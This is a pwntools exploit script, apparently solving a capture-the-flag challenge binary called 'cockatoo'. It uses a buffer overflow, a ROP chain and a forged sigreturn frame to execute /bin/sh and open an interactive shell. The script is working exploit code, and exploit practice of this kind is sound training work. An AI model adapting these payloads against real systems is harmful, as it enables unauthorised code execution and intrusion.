from pwn import *
context.arch = "amd64"

p = process("./cockatoo")
elf = ELF("./cockatoo", checksec = False)
rop = ROP(elf)
BINSH = elf.bss(0x200)
print(hex(BINSH))
gdb.attach(p)
payload = p8(0xf) * 257
payload += p64(BINSH)
payload += p64(rop.find_gadget(['pop rax', 'ret'])[0])
payload += p64(elf.sym.main)
payload += p64(0x0000000000401513)
payload += p64(BINSH)
payload += p64(0)
p.sendline(payload)
payload = b"/bin/sh\x00"
payload += p8(0xf) * 249
payload += p64(0)
payload += p64(rop.find_gadget(['pop rax', 'ret'])[0])
payload += p64(0xf)
payload += p64(rop.find_gadget(['syscall', 'ret'])[0])
frame = SigreturnFrame(kernel = "amd64")
frame.rax = 0x3b        
frame.rdi = BINSH - 0x110    
frame.rsi = 0x0         
frame.rdx = 0x0         
frame.rip = 0x0000000000401a8b
payload += bytes(frame)
p.sendline(payload)
p.interactive()